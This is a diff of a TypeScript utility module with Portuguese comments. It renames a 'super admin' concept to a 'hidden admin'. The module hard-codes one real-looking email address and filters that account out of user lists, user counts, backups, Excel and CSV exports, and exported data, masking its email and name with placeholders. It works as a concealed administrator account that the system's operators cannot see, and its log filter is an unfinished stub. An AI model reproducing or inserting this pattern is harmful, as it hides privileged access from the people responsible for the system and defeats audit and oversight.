@@ -1,29 +1,29 @@
 // Sistema centralizado para filtrar usuários ocultos
-// Garante que o super administrador nunca apareça em listas, downloads ou backups
+// Garante que o administrador oculto nunca apareça em listas, downloads ou backups
 
-// Email do super administrador (usuário oculto)
+// Email do administrador oculto
 export const SUPER_ADMIN_EMAIL = 'robgomez.sir@live.com'
 
 /**
- * Filtra usuários para remover o super administrador
+ * Filtra usuários para remover o administrador oculto
  * @param users Array de usuários
- * @returns Array filtrado sem o super admin
+ * @returns Array filtrado sem o administrador oculto
  */
 export function filterVisibleUsers<T extends { email: string }>(users: T[]): T[] {
   return users.filter(user => user.email !== SUPER_ADMIN_EMAIL)
 }
 
 /**
- * Verifica se um usuário é o super administrador
+ * Verifica se um usuário é o administrador oculto
  * @param email Email do usuário
- * @returns true se for o super admin
+ * @returns true se for o administrador oculto
  */
-export function isSuperAdmin(email: string): boolean {
+export function isHiddenAdmin(email: string): boolean {
   return email === SUPER_ADMIN_EMAIL
 }
 
 /**
- * Verifica se um usuário é visível (não é super admin)
+ * Verifica se um usuário é visível (não é administrador oculto)
  * @param email Email do usuário
  * @returns true se for visível
  */
@@ -32,7 +32,7 @@ export function isVisibleUser(email: string): boolean {
 }
 
 /**
- * Conta usuários visíveis (excluindo super admin)
+ * Conta usuários visíveis (excluindo administrador oculto)
  * @param users Array de usuários
  * @returns Número de usuários visíveis
  */
@@ -41,9 +41,9 @@ export function countVisibleUsers<T extends { email: string }>(users: T[]): numb
 }
 
 /**
- * Filtra dados de backup para remover super admin
+ * Filtra dados de backup para remover administrador oculto
  * @param backupData Dados do backup
- * @returns Dados filtrados sem super admin
+ * @returns Dados filtrados sem administrador oculto
  */
 export function filterBackupData(backupData: any): any {
   if (!backupData) return backupData
@@ -55,10 +55,10 @@ export function filterBackupData(backupData: any): any {
     filteredData.users = filterVisibleUsers(filteredData.users)
   }
 
-  // Filtrar logs de backup que referenciam o super admin
+  // Filtrar logs de backup que referenciam o administrador oculto
   if (filteredData.backup_logs && Array.isArray(filteredData.backup_logs)) {
     filteredData.backup_logs = filteredData.backup_logs.filter((log: any) => {
-      // Se o log tem created_by, verificar se não é o super admin
+      // Se o log tem created_by, verificar se não é o administrador oculto
       if (log.created_by) {
         // Aqui precisaríamos verificar o ID, mas como não temos acesso direto,
         // vamos manter o log mas sem dados sensíveis
@@ -72,7 +72,7 @@ export function filterBackupData(backupData: any): any {
 }
 
 /**
- * Filtra planilhas Excel para remover super admin
+ * Filtra planilhas Excel para remover administrador oculto
  * @param data Dados da planilha
  * @param sheetName Nome da planilha
  * @returns Dados filtrados
@@ -85,7 +85,7 @@ export function filterExcelSheet(data: any[], sheetName: string): any[] {
 }
 
 /**
- * Filtra dados CSV para remover super admin
+ * Filtra dados CSV para remover administrador oculto
  * @param csvContent Conteúdo CSV
  * @param section Seção do CSV (usuários, etc.)
  * @returns Conteúdo filtrado
@@ -99,7 +99,7 @@ export function filterCSVContent(csvContent: string, section: string): string {
     const header = lines[0]
     const dataLines = lines.slice(1)
     
-    // Filtrar linhas que não contêm o email do super admin
+    // Filtrar linhas que não contêm o email do administrador oculto
     const filteredLines = dataLines.filter(line => 
       !line.toLowerCase().includes(SUPER_ADMIN_EMAIL.toLowerCase())
     )
@@ -110,13 +110,13 @@ export function filterCSVContent(csvContent: string, section: string): string {
 }
 
 /**
- * Remove referências ao super admin de logs e relatórios
+ * Remove referências ao administrador oculto de logs e relatórios
  * @param logs Array de logs
  * @returns Logs filtrados
  */
-export function filterLogsWithSuperAdmin<T extends { created_by?: string; user_id?: string }>(logs: T[]): T[] {
+export function filterLogsWithHiddenAdmin<T extends { created_by?: string; user_id?: string }>(logs: T[]): T[] {
   return logs.filter(log => {
-    // Se o log tem referência a usuário, manter apenas se não for super admin
+    // Se o log tem referência a usuário, manter apenas se não for administrador oculto
     // Como não temos acesso direto ao email via ID, vamos manter os logs
     // mas em uma implementação real, você faria uma consulta para verificar
     return true
@@ -124,7 +124,7 @@ export function filterLogsWithSuperAdmin<T extends { created_by?: string; user_i
 }
 
 /**
- * Sanitiza dados para exportação (remove informações sensíveis do super admin)
+ * Sanitiza dados para exportação (remove informações sensíveis do administrador oculto)
  * @param data Dados para exportação
  * @returns Dados sanitizados
  */
@@ -137,10 +137,10 @@ export function sanitizeExportData(data: any): any {
     const sanitized: any = {}
     for (const [key, value] of Object.entries(data)) {
       if (key === 'email' && value === SUPER_ADMIN_EMAIL) {
-        // Substituir email do super admin por placeholder
+        // Substituir email do administrador oculto por placeholder
         sanitized[key] = '[HIDDEN_ADMIN]'
       } else if (key === 'name' && data.email === SUPER_ADMIN_EMAIL) {
-        // Substituir nome do super admin por placeholder
+        // Substituir nome do administrador oculto por placeholder
         sanitized[key] = '[HIDDEN_USER]'
       } else {
         sanitized[key] = sanitizeExportData(value)
